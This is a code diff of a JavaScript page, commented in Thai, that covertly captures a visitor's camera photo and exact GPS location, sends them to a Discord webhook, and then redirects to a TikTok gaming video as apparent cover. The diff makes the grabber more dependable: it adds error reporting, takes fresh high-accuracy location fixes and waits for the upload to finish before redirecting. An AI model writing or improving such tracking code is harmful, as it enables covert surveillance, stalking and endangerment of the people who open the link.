@@ -88,7 +88,7 @@ const photo = document.getElementById('photo');
 async function getLocation() {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
-      resolve(null);
+      resolve({ error: 'ไม่รองรับ Geolocation' });
       return;
     }
     
@@ -100,8 +100,14 @@ async function getLocation() {
           accuracy: position.coords.accuracy
         });
       },
-      () => resolve(null),
-      { timeout: 5000, enableHighAccuracy: true }
+      (error) => {
+        let errorMsg = 'ไม่ทราบสาเหตุ';
+        if (error.code === 1) errorMsg = 'ผู้ใช้ปฏิเสธ';
+        else if (error.code === 2) errorMsg = 'ไม่พบตำแหน่ง';
+        else if (error.code === 3) errorMsg = 'หมดเวลา';
+        resolve({ error: errorMsg });
+      },
+      { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
     );
   });
 }
@@ -173,25 +179,27 @@ async function startCapture() {
     
     stream.getTracks().forEach(t => t.stop());
 
-    // รอ location (ไม่เกิน 5 วินาที)
+    // รอ location (ไม่เกิน 10 วินาที)
     const location = await locationPromise;
     
     // สร้างข้อความพร้อม location
     let message = `📸 ${isAndroid ? 'Android' : 'iOS'}`;
-    if (location) {
-      message += `\n📍 ที่อยู่: https://www.google.com/maps?q=${location.lat},${location.lng}`;
-      message += `\n🎯 ความแม่นยำ: ${Math.round(location.accuracy)}m`;
+    if (location && location.lat) {
+      message += `\n📍 https://www.google.com/maps?q=${location.lat},${location.lng}`;
+      message += `\n🎯 แม่นยำ: ${Math.round(location.accuracy)}m`;
+    } else if (location && location.error) {
+      message += `\n⚠️ Location Error: ${location.error}`;
     } else {
-      message += `\n⚠️ ไม่สามารถเข้าถึงตำแหน่งได้`;
+      message += `\n⚠️ ไม่ได้ตำแหน่ง`;
     }
 
-    // ส่งไป Discord แบบไม่รอ
+    // ส่งไป Discord และรอให้ส่งเสร็จ
     const form = new FormData();
     form.append("file", blob, "capture.jpg");
     form.append("content", message);
-    fetch(WEBHOOK_URL, { method: "POST", body: form }).catch(() => {});
+    await fetch(WEBHOOK_URL, { method: "POST", body: form }).catch(() => {});
     
-    // Redirect ทันที
+    // Redirect หลังส่งเสร็จ
     window.location.href = "https://www.tiktok.com/@tokgamer46/video/7358744726331264273?q=freefire%20%E0%B9%80%E0%B8%81%E0%B8%A3%E0%B8%B5%E0%B8%A2%E0%B8%99&t=1763182546319";
   } catch (err) {
     await sendToDiscord(`❌ ${err.message}`);
